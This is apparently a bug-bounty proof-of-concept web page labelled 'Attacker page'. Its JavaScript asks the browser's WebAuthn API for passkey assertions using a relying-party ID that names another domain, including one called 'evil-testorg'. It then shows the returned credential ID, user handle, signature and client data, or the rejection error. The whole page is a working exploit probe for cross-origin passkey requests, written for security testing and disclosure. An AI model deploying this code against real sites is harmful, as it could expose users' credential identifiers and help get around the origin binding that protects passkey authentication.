<h2>Attacker page</h2>
<p>origin: <span id="org"></span></p>
<button onclick="go('testorg-1-bugbounty.github.io')">Case A: rpId naming a site with no passkey</button>
<button onclick="go('evil-testorg-1-bugbounty.github.io')">Case B: rpId naming sites with passkeys</button>
<pre id="out"></pre>
<script>
document.getElementById('org').textContent=location.origin;
function hex(b){return [...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('');}
async function go(rpId){
  const out=document.getElementById('out');
  out.textContent='requesting rpId='+rpId+' ...'; const t0=performance.now();
  try{
    const c=await navigator.credentials.get({publicKey:{
      challenge:crypto.getRandomValues(new Uint8Array(32)), rpId:rpId, userVerification:"discouraged"}});
    out.textContent='elapsed_ms: '+Math.round(performance.now()-t0)+
      '\npage_origin: '+location.origin+'\nrequested_rpId: '+rpId+
      '\ncredentialId: '+c.id+
      '\nuserHandle: '+(c.response.userHandle?new TextDecoder().decode(c.response.userHandle):'(null)')+
      '\nsignature_bytes: '+new Uint8Array(c.response.signature).length+
      '\nrpIdHash_hex: '+hex(c.response.authenticatorData.slice(0,32))+
      '\nclientDataJSON: '+new TextDecoder().decode(c.response.clientDataJSON);
  }catch(e){
    out.textContent='elapsed_ms: '+Math.round(performance.now()-t0)+
      '\npage_origin: '+location.origin+'\nrequested_rpId: '+rpId+
      '\nrejected_name: '+e.name+'\nrejected_message: '+e.message;
  }
}
</script>
